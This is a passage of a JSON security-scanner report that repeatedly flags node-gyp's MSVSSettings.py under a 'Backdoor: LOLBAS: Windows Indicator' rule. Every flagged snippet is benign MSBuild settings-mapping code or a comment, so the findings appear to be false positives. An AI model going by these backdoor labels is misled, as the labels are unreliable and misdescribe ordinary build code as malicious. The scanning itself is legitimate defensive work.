                      "text": "\n# Directives for converting VCManifestTool to Mt.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\mt.xml\" for\n# the schema of the MSBuild Lib settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_manifest, \"AdditionalManifestFiles\", _file_list)  # /manifest\n",
                      "markdown": "`\n# Directives for converting VCManifestTool to Mt.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\mt.xml\" for\n# the schema of the MSBuild Lib settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_manifest, \"AdditionalManifestFiles\", _file_list)  # /manifest\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 1178,
                  "startColumn": 19,
                  "endLine": 1178,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Directives for converting VCLibrarianTool to Lib.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\lib.xml\" for\n# the schema of the MSBuild Lib settings.\n\n_Same(_lib, \"AdditionalDependencies\", _file_list)\n_Same(_lib, \"AdditionalLibraryDirectories\", _folder_list)  # /LIBPATH\n",
                    "rendered": {
                      "text": "\n# Directives for converting VCLibrarianTool to Lib.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\lib.xml\" for\n# the schema of the MSBuild Lib settings.\n\n_Same(_lib, \"AdditionalDependencies\", _file_list)\n_Same(_lib, \"AdditionalLibraryDirectories\", _folder_list)  # /LIBPATH\n",
                      "markdown": "`\n# Directives for converting VCLibrarianTool to Lib.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\lib.xml\" for\n# the schema of the MSBuild Lib settings.\n\n_Same(_lib, \"AdditionalDependencies\", _file_list)\n_Same(_lib, \"AdditionalLibraryDirectories\", _folder_list)  # /LIBPATH\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 1158,
                  "startColumn": 1,
                  "endLine": 1158,
                  "endColumn": 10,
                  "snippet": {
                    "text": "_Renamed(_midl, \"DLLDataFileName\", \"DllDataFileName\", _file_name)  # /dlldata\n_Renamed(_midl, \"ValidateParameters\", \"ValidateAllParameters\", _boolean)  # /robust\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_midl, \"ApplicationConfigurationMode\", _boolean)  # /app_config\n_MSBuildOnly(_midl, \"ClientStubFile\", _file_name)  # /cstub\n_MSBuildOnly(\n",
                    "rendered": {
                      "text": "_Renamed(_midl, \"DLLDataFileName\", \"DllDataFileName\", _file_name)  # /dlldata\n_Renamed(_midl, \"ValidateParameters\", \"ValidateAllParameters\", _boolean)  # /robust\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_midl, \"ApplicationConfigurationMode\", _boolean)  # /app_config\n_MSBuildOnly(_midl, \"ClientStubFile\", _file_name)  # /cstub\n_MSBuildOnly(\n",
                      "markdown": "`_Renamed(_midl, \"DLLDataFileName\", \"DllDataFileName\", _file_name)  # /dlldata\n_Renamed(_midl, \"ValidateParameters\", \"ValidateAllParameters\", _boolean)  # /robust\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_midl, \"ApplicationConfigurationMode\", _boolean)  # /app_config\n_MSBuildOnly(_midl, \"ClientStubFile\", _file_name)  # /cstub\n_MSBuildOnly(\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 1096,
                  "startColumn": 19,
                  "endLine": 1096,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Directives for converting VCMIDLTool to Midl.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\midl.xml\" for\n# the schema of the MSBuild Midl settings.\n\n_Same(_midl, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n_Same(_midl, \"AdditionalOptions\", _string_list)\n",
                    "rendered": {
                      "text": "\n# Directives for converting VCMIDLTool to Midl.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\midl.xml\" for\n# the schema of the MSBuild Midl settings.\n\n_Same(_midl, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n_Same(_midl, \"AdditionalOptions\", _string_list)\n",
                      "markdown": "`\n# Directives for converting VCMIDLTool to Midl.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\midl.xml\" for\n# the schema of the MSBuild Midl settings.\n\n_Same(_midl, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n_Same(_midl, \"AdditionalOptions\", _string_list)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 1089,
                  "startColumn": 1,
                  "endLine": 1089,
                  "endColumn": 10,
                  "snippet": {
                    "text": "_Same(_rc, \"SuppressStartupBanner\", _boolean)  # /nologo\n_Same(_rc, \"UndefinePreprocessorDefinitions\", _string_list)  # /u\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_rc, \"NullTerminateStrings\", _boolean)  # /n\n_MSBuildOnly(_rc, \"TrackerLogDirectory\", _folder_name)\n\n",
                    "rendered": {
                      "text": "_Same(_rc, \"SuppressStartupBanner\", _boolean)  # /nologo\n_Same(_rc, \"UndefinePreprocessorDefinitions\", _string_list)  # /u\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_rc, \"NullTerminateStrings\", _boolean)  # /n\n_MSBuildOnly(_rc, \"TrackerLogDirectory\", _folder_name)\n\n",
                      "markdown": "`_Same(_rc, \"SuppressStartupBanner\", _boolean)  # /nologo\n_Same(_rc, \"UndefinePreprocessorDefinitions\", _string_list)  # /u\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_rc, \"NullTerminateStrings\", _boolean)  # /n\n_MSBuildOnly(_rc, \"TrackerLogDirectory\", _folder_name)\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 1074,
                  "startColumn": 19,
                  "endLine": 1074,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Directives for converting VCResourceCompilerTool to ResourceCompile.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\rc.xml\" for\n# the schema of the MSBuild ResourceCompile settings.\n\n_Same(_rc, \"AdditionalOptions\", _string_list)\n_Same(_rc, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n",
                    "rendered": {
                      "text": "\n# Directives for converting VCResourceCompilerTool to ResourceCompile.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\rc.xml\" for\n# the schema of the MSBuild ResourceCompile settings.\n\n_Same(_rc, \"AdditionalOptions\", _string_list)\n_Same(_rc, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n",
                      "markdown": "`\n# Directives for converting VCResourceCompilerTool to ResourceCompile.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\rc.xml\" for\n# the schema of the MSBuild ResourceCompile settings.\n\n_Same(_rc, \"AdditionalOptions\", _string_list)\n_Same(_rc, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 1020,
                  "startColumn": 1,
                  "endLine": 1020,
                  "endColumn": 10,
                  "snippet": {
                    "text": "_MSVSOnly(_link, \"OptimizeForWindows98\", _newly_boolean)\n_MSVSOnly(_link, \"UseUnicodeResponseFiles\", _boolean)\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_link, \"BuildingInIDE\", _boolean)\n_MSBuildOnly(_link, \"ImageHasSafeExceptionHandlers\", _boolean)  # /SAFESEH\n_MSBuildOnly(_link, \"LinkDLL\", _boolean)  # /DLL Visible='false'\n",
                    "rendered": {
                      "text": "_MSVSOnly(_link, \"OptimizeForWindows98\", _newly_boolean)\n_MSVSOnly(_link, \"UseUnicodeResponseFiles\", _boolean)\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_link, \"BuildingInIDE\", _boolean)\n_MSBuildOnly(_link, \"ImageHasSafeExceptionHandlers\", _boolean)  # /SAFESEH\n_MSBuildOnly(_link, \"LinkDLL\", _boolean)  # /DLL Visible='false'\n",
                      "markdown": "`_MSVSOnly(_link, \"OptimizeForWindows98\", _newly_boolean)\n_MSVSOnly(_link, \"UseUnicodeResponseFiles\", _boolean)\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_link, \"BuildingInIDE\", _boolean)\n_MSBuildOnly(_link, \"ImageHasSafeExceptionHandlers\", _boolean)  # /SAFESEH\n_MSBuildOnly(_link, \"LinkDLL\", _boolean)  # /DLL Visible='false'\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 813,
                  "startColumn": 45,
                  "endLine": 814,
                  "snippet": {
                    "text": "# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\link.xml\" for\n# the schema of the MSBuild Link settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_link, \"AdditionalDependencies\", _file_list)\n_Same(_link, \"AdditionalLibraryDirectories\", _folder_list)  # /LIBPATH\n#  /MANIFESTDEPENDENCY:\n_Same(_link, \"AdditionalManifestDependencies\", _file_list)\n",
                    "rendered": {
                      "text": "# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\link.xml\" for\n# the schema of the MSBuild Link settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_link, \"AdditionalDependencies\", _file_list)\n_Same(_link, \"AdditionalLibraryDirectories\", _folder_list)  # /LIBPATH\n#  /MANIFESTDEPENDENCY:\n_Same(_link, \"AdditionalManifestDependencies\", _file_list)\n",
                      "markdown": "`# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\link.xml\" for\n# the schema of the MSBuild Link settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_link, \"AdditionalDependencies\", _file_list)\n_Same(_link, \"AdditionalLibraryDirectories\", _folder_list)  # /LIBPATH\n#  /MANIFESTDEPENDENCY:\n_Same(_link, \"AdditionalManifestDependencies\", _file_list)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 811,
                  "startColumn": 19,
                  "endLine": 811,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n# Directives for converting MSVS VCLinkerTool to MSBuild Link.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\link.xml\" for\n# the schema of the MSBuild Link settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_link, \"AdditionalDependencies\", _file_list)\n",
                    "rendered": {
                      "text": "\n# Directives for converting MSVS VCLinkerTool to MSBuild Link.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\link.xml\" for\n# the schema of the MSBuild Link settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_link, \"AdditionalDependencies\", _file_list)\n",
                      "markdown": "`\n# Directives for converting MSVS VCLinkerTool to MSBuild Link.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\link.xml\" for\n# the schema of the MSBuild Link settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_link, \"AdditionalDependencies\", _file_list)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 809,
                  "startColumn": 48,
                  "endLine": 809,
                  "endColumn": 57,
                  "snippet": {
                    "text": "_CustomGeneratePreprocessedFile(_compile, \"GeneratePreprocessedFile\")\n\n\n# Directives for converting MSVS VCLinkerTool to MSBuild Link.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\link.xml\" for\n# the schema of the MSBuild Link settings.\n\n",
                    "rendered": {
                      "text": "_CustomGeneratePreprocessedFile(_compile, \"GeneratePreprocessedFile\")\n\n\n# Directives for converting MSVS VCLinkerTool to MSBuild Link.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\link.xml\" for\n# the schema of the MSBuild Link settings.\n\n",
                      "markdown": "`_CustomGeneratePreprocessedFile(_compile, \"GeneratePreprocessedFile\")\n\n\n# Directives for converting MSVS VCLinkerTool to MSBuild Link.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\link.xml\" for\n# the schema of the MSBuild Link settings.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 790,
                  "startColumn": 1,
                  "endLine": 790,
                  "endColumn": 10,
                  "snippet": {
                    "text": "_MSVSOnly(_compile, \"Detect64BitPortabilityProblems\", _boolean)\n_MSVSOnly(_compile, \"UseUnicodeResponseFiles\", _boolean)\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_compile, \"BuildingInIDE\", _boolean)\n_MSBuildOnly(\n    _compile, \"CompileAsManaged\", _Enumeration([], new=[\"false\", \"true\"])\n",
                    "rendered": {
                      "text": "_MSVSOnly(_compile, \"Detect64BitPortabilityProblems\", _boolean)\n_MSVSOnly(_compile, \"UseUnicodeResponseFiles\", _boolean)\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_compile, \"BuildingInIDE\", _boolean)\n_MSBuildOnly(\n    _compile, \"CompileAsManaged\", _Enumeration([], new=[\"false\", \"true\"])\n",
                      "markdown": "`_MSVSOnly(_compile, \"Detect64BitPortabilityProblems\", _boolean)\n_MSVSOnly(_compile, \"UseUnicodeResponseFiles\", _boolean)\n\n# MSBuild options not found in MSVS.\n_MSBuildOnly(_compile, \"BuildingInIDE\", _boolean)\n_MSBuildOnly(\n    _compile, \"CompileAsManaged\", _Enumeration([], new=[\"false\", \"true\"])\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 676,
                  "startColumn": 45,
                  "endLine": 676,
                  "endColumn": 54,
                  "snippet": {
                    "text": "            \"StreamingSIMDExtensions2\",  # /arch:SSE2\n            \"AdvancedVectorExtensions\",  # /arch:AVX (vs2012+)\n            \"NoExtensions\",  # /arch:IA32 (vs2012+)\n            # This one only exists in the new msbuild format.\n            \"AdvancedVectorExtensions2\",  # /arch:AVX2 (vs2013r2+)\n        ]\n    ),\n",
                    "rendered": {
                      "text": "            \"StreamingSIMDExtensions2\",  # /arch:SSE2\n            \"AdvancedVectorExtensions\",  # /arch:AVX (vs2012+)\n            \"NoExtensions\",  # /arch:IA32 (vs2012+)\n            # This one only exists in the new msbuild format.\n            \"AdvancedVectorExtensions2\",  # /arch:AVX2 (vs2013r2+)\n        ]\n    ),\n",
                      "markdown": "`            \"StreamingSIMDExtensions2\",  # /arch:SSE2\n            \"AdvancedVectorExtensions\",  # /arch:AVX (vs2012+)\n            \"NoExtensions\",  # /arch:IA32 (vs2012+)\n            # This one only exists in the new msbuild format.\n            \"AdvancedVectorExtensions2\",  # /arch:AVX2 (vs2013r2+)\n        ]\n    ),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 579,
                  "startColumn": 45,
                  "endLine": 580,
                  "snippet": {
                    "text": "# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\cl.xml\" for\n# the schema of the MSBuild ClCompile settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_compile, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n_Same(_compile, \"AdditionalOptions\", _string_list)\n_Same(_compile, \"AdditionalUsingDirectories\", _folder_list)  # /AI\n_Same(_compile, \"AssemblerListingLocation\", _file_name)  # /Fa\n",
                    "rendered": {
                      "text": "# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\cl.xml\" for\n# the schema of the MSBuild ClCompile settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_compile, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n_Same(_compile, \"AdditionalOptions\", _string_list)\n_Same(_compile, \"AdditionalUsingDirectories\", _folder_list)  # /AI\n_Same(_compile, \"AssemblerListingLocation\", _file_name)  # /Fa\n",
                      "markdown": "`# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\cl.xml\" for\n# the schema of the MSBuild ClCompile settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_compile, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n_Same(_compile, \"AdditionalOptions\", _string_list)\n_Same(_compile, \"AdditionalUsingDirectories\", _folder_list)  # /AI\n_Same(_compile, \"AssemblerListingLocation\", _file_name)  # /Fa\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 577,
                  "startColumn": 19,
                  "endLine": 577,
                  "endColumn": 28,
                  "snippet": {
                    "text": "# Descriptions of the compiler options, i.e. VCCLCompilerTool in MSVS and\n# ClCompile in MSBuild.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\cl.xml\" for\n# the schema of the MSBuild ClCompile settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_compile, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n",
                    "rendered": {
                      "text": "# Descriptions of the compiler options, i.e. VCCLCompilerTool in MSVS and\n# ClCompile in MSBuild.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\cl.xml\" for\n# the schema of the MSBuild ClCompile settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_compile, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n",
                      "markdown": "`# Descriptions of the compiler options, i.e. VCCLCompilerTool in MSVS and\n# ClCompile in MSBuild.\n# See \"c:\\Program Files (x86)\\MSBuild\\Microsoft.Cpp\\v4.0\\1033\\cl.xml\" for\n# the schema of the MSBuild ClCompile settings.\n\n# Options that have the same name in MSVS and MSBuild\n_Same(_compile, \"AdditionalIncludeDirectories\", _folder_list)  # /I\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 569,
                  "startColumn": 32,
                  "endLine": 569,
                  "endColumn": 41,
                  "snippet": {
                    "text": "_AddTool(_manifest)\n_AddTool(_masm)\n_AddTool(_armasm)\n# Add sections only found in the MSBuild settings.\n_msbuild_validators[\"\"] = {}\n_msbuild_validators[\"ProjectReference\"] = {}\n_msbuild_validators[\"ManifestResourceCompile\"] = {}\n",
                    "rendered": {
                      "text": "_AddTool(_manifest)\n_AddTool(_masm)\n_AddTool(_armasm)\n# Add sections only found in the MSBuild settings.\n_msbuild_validators[\"\"] = {}\n_msbuild_validators[\"ProjectReference\"] = {}\n_msbuild_validators[\"ManifestResourceCompile\"] = {}\n",
                      "markdown": "`_AddTool(_manifest)\n_AddTool(_masm)\n_AddTool(_armasm)\n# Add sections only found in the MSBuild settings.\n_msbuild_validators[\"\"] = {}\n_msbuild_validators[\"ProjectReference\"] = {}\n_msbuild_validators[\"ManifestResourceCompile\"] = {}\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 516,
                  "startColumn": 48,
                  "endLine": 516,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n\ndef _ValidateSettings(validators, settings, stderr):\n    \"\"\"Validates that the settings are valid for MSBuild or MSVS.\n\n  We currently only validate the names of the settings, not their values.\n\n",
                    "rendered": {
                      "text": "\n\ndef _ValidateSettings(validators, settings, stderr):\n    \"\"\"Validates that the settings are valid for MSBuild or MSVS.\n\n  We currently only validate the names of the settings, not their values.\n\n",
                      "markdown": "`\n\ndef _ValidateSettings(validators, settings, stderr):\n    \"\"\"Validates that the settings are valid for MSBuild or MSVS.\n\n  We currently only validate the names of the settings, not their values.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 454,
                  "startColumn": 62,
                  "endLine": 454,
                  "endColumn": 71,
                  "snippet": {
                    "text": "      stderr: The stream receiving the error messages.\n\n  Returns:\n      A dictionary of MSBuild settings.  The key is either the MSBuild tool name\n      or the empty string (for the global settings).  The values are themselves\n      dictionaries of settings and their values.\n  \"\"\"\n",
                    "rendered": {
                      "text": "      stderr: The stream receiving the error messages.\n\n  Returns:\n      A dictionary of MSBuild settings.  The key is either the MSBuild tool name\n      or the empty string (for the global settings).  The values are themselves\n      dictionaries of settings and their values.\n  \"\"\"\n",
                      "markdown": "`      stderr: The stream receiving the error messages.\n\n  Returns:\n      A dictionary of MSBuild settings.  The key is either the MSBuild tool name\n      or the empty string (for the global settings).  The values are themselves\n      dictionaries of settings and their values.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 454,
                  "startColumn": 21,
                  "endLine": 454,
                  "endColumn": 30,
                  "snippet": {
                    "text": "      stderr: The stream receiving the error messages.\n\n  Returns:\n      A dictionary of MSBuild settings.  The key is either the MSBuild tool name\n      or the empty string (for the global settings).  The values are themselves\n      dictionaries of settings and their values.\n  \"\"\"\n",
                    "rendered": {
                      "text": "      stderr: The stream receiving the error messages.\n\n  Returns:\n      A dictionary of MSBuild settings.  The key is either the MSBuild tool name\n      or the empty string (for the global settings).  The values are themselves\n      dictionaries of settings and their values.\n  \"\"\"\n",
                      "markdown": "`      stderr: The stream receiving the error messages.\n\n  Returns:\n      A dictionary of MSBuild settings.  The key is either the MSBuild tool name\n      or the empty string (for the global settings).  The values are themselves\n      dictionaries of settings and their values.\n  \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/MSVSSettings.py"
                },
                "region": {
                  "startLine": 446,
                  "startColumn": 53,
                  "endLine": 446,
                  "endColumn": 62,
                  "snippet": {
